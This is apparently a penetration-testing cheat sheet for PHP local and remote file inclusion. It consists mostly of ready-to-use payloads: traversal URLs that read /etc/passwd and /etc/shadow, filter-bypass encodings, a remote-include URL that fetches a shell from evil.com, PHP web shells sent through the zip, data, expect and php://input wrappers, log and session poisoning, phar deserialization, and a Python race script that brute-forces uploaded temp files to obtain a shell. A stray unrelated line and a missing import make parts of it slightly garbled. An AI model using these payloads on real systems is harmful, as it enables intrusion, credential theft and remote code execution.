# Local/Remote File Inclusion

The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.

## Summary

* [Basic LFI](#basic-lfi)
* [Basic RFI](#basic-rfi)
* [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
  * [Wrapper php://filter](l#wrapper-phpfilter)
  * [Wrapper zip://](#wrapper-zip)
  * [Wrapper data://](#wrapper-data)
  * [Wrapper expect://](#wrapper-expect)
  * [Wrapper input://](#wrapper-input)
  * [Wrapper phar://](#wrapper-phar)
* [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
* [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
* [LFI to RCE via upload](#lfi-to-rce-via-upload)
* [LFI to RCE via upload (race)](#lfi-to-rce-via-upload-race)
* [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
* [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
* [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)

Linux - Interesting files to check out :

```powershell
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
```

Windows - Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)

```powershell
c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
```

The following log files are controllable and can be included with an evil payload to achieve a command execution

```powershell
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
```

## Basic LFI

```powershell
http://example.com/index.php?page=../../../etc/passwd
```

Null byte

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

Double encoding

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

Path truncation

```powershell
http://example.com/index.php?page=../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=../../../../[…]../../../../../etc/passwd
```

Filter bypass tricks

```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

## Basic RFI

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

Null byte

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

Double encoding

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

## LFI / RFI using wrappers

### Wrapper php://filter

The part "php://filter" is case insensitive

```powershell
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

can be chained with a compression wrapper for large files.

```powershell
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

NOTE: Wrappers can be chained : `php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s`

### Wrapper zip://

```python
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

### Wrapper data://

```powershell
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

### Wrapper expect://

```powershell
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

### Wrapper input://

Specify your payload in the POST parameters

```powershell
http://example.com/index.php?page=php://input
POST DATA: <? system('id'); ?>
```

### Wrapper phar://

Create a phar file with a serialized object in its meta-data.

```php
// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
```

If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked

```php
class AnyClass {
    function __destruct() {
        echo $this->data;
    }
}
// output: rips
include('phar://test.phar');
```

NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, `file_exists` and many more.

## LFI to RCE via /proc/*/fd

1. Upload a lot of shells (for example : 100)
2. Include http://example.com/index.php?page=/proc/$PID/fd/$FD, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)

## LFI to RCE via /proc/self/environ

Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

## LFI to RCE via upload

If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```

In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf

## LFI to RCE via upload (race)
Worlds Quitest Let's Play"
* Upload a file and trigger a self-inclusion.
* Repeat 1 a shitload of time to:
* increase our odds of winning the race
* increase our guessing odds
* Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}
* Enjoy our shell.

```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```


## LFI to RCE via phpinfo()

https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

## LFI to RCE via controlled log file

Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.

```powershell
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

## LFI to RCE via PHP sessions

Check if the website use PHP Session (PHPSESSID)

```javascript
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] files

```javascript
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

Set the cookie to `<?php system('cat /etc/passwd');?>`

```powershell
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

Use the LFI to include the PHP session file

```powershell
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

## Thanks to

* [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
* [HighOn.coffee LFI Cheat](https://highon.coffee/blog/lfi-cheat-sheet/)
* [Turning LFI to RFI](https://l.avala.mp/?p=241)
* [Is PHP vulnerable and under what conditions?](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
* [Upgrade from LFI to RCE via PHP Sessions](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)
* [Local file inclusion tricks](http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
* [CVV #1: Local File Inclusion - SI9INT](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
* [Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos](http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
* [Baby^H Master PHP 2017 by @orangetw](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
* [Чтение файлов => unserialize !](https://rdot.org/forum/showthread.php?t=4379)
* [New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
* [It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
* [Local file inclusion mini list - Penetrate.io](https://penetrate.io/2014/09/25/local-file-inclusion-mini-list/)